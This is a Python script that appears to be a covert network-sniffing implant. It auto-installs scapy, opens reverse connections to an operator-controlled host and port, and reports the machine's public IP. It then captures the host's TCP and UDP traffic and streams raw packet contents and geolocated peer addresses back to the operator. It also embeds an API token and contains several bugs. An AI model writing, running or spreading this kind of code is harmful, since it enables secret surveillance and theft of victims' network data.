import os
try:
	import scapy.all
	from scapy.all import * 
except:
	os.system("pip3 install scapy")
import socket
import os
import json
import platform
import requests
def __main__():
	try:
		rhost = '192.168.0.100' # Your PUBLIC IP
		rport = 5731 # Forwarded Port
		clport = 5732
		cl = socket.socket()
		sr = socket.socket()
		sr.connect((rhost, rport))
		cl.connect((rhost, clport))
	except:
		time.sleep(5)
	dr = sr.recv(14813).decode()
	if 'infome' in dr:
		op = requests.get("https://api64.ipify.org?format=json")
		js = json.loads(op.text)
		ip = js["ip"]
	
	sr.send(f"[*] IP: {ip}".encode())
	def sniffer(pkt):
		if pkt.haslayer(UDP):
			lipu = socket.gethostname()
			lipud = socket.gethostbyname(lipu)
			if lipud == pkt[IP].dst:
				try:
					j = requests.get(f"https://ipinfo.io/{pkt[IP].src}?token=9c7cf21e40bd6e")
					js = json.loads(j.text)
					city_2 = j["city"]
					country_2 = j["country"]
				except:
					city_2 = "Unknown"
					country_2 = "Unknown"
				sr.send(f"[SR1][UDP] {pkt[IP].src} =====> {lipud} Packets: {len(pkt[UDP])} Ports: {pkt.dport} | City: {city_2}  Country: {country_2}".encode())
				cl.send(f"[*] DATA[UDP]: ".encode() + str(pkt[UDP]).encode())
			if lipud == pkt[IP].src:
				try:
					j_ = requests.get(f"https://ipinfo.io/{pkt[IP].dst}?token=9c7cf21e40bd6e")
					js_ = json.loads(j_.text)
					cit_2 = js_["city"]
					con_2 = js_["country"]
				except:
					cit_2 = "Unknown"
					con_2 = "Unknown"
				sr.send(f"[SR2][UDP] {lipud} =====> {pkt[IP].dst} Packets: {len(pkt[UDP])} Ports: {pkt.dport} | City: {cit_2} Country: {con_2}".encode())
				cl.send(f"[*] DATA[UDP]: ".encode() + str(pkt[UDP]).encode())
		if pkt.haslayer(TCP):
			lip = socket.gethostname()
			lips = socket.gethostbyname(lip)
			if lips == pkt[IP].dst:
				try:
					req = requests.get(f"https://ipinfo.io/{pkt[IP].src}?token=9c7cf21e40bd6e")
					recv = json.loads(req.text)
					city = recv["city"]
					country = recv["country"]
				except:
					city = "Unknown"
					country = "Unknown"
				sr.send(f"[SR1][TCP] {pkt[IP].src} ======-> {lips}  Packets: {len(pkt[TCP])} Ports: {pkt.dport} | City: {city} Country: {country}".encode())
				cl.send(f"[*] DATA: ".encode() + str(pkt[TCP]).encode())
			if lips == pkt[IP].src:
				try:
					req_ = reuqests.get(f"https://ipinfo.io/{pkt[IP].dst}?token=9c7cf21e40bd6e")
					recv_ = json.loads(req_.text)
					cit = recv_["city"]
					con = recv_["country"]
				except:
					cit = "Unknown"
					con = "Unknown"
				sr.send(f"[SR2][TCP] {lips} =====-> {pkt[IP].dst} Packets: {len(pkt[TCP])} Ports: {pkt.dport} | City: {cit} Country: {con}".encode())
				cl.send(f"[*] DATA: ".encode() + str(pkt[TCP]).encode())
	sniff(prn=sniffer)
__main__()
